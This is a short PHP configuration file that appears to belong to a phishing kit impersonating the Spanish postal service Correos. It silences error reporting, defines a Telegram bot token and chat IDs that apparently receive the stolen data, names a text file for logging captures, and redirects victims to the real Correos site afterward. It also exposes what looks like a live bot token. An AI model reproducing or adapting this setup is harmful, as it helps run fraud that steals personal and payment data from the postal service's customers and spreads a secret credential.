<?php

error_reporting(0);

define("TELEGRAM_TOKEN", "5532119264:AAHOT9fkN5c4E4eQUclPOxJ8QqtzRctWMao");
define("TELEGRAM_CHAT_ID", "-1001746747385");
define("TELEGRAM_CHAT_IDD", "-1001746747385");
define("TXT_FILE_NAME", 'mjinina.txt');
define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");



?>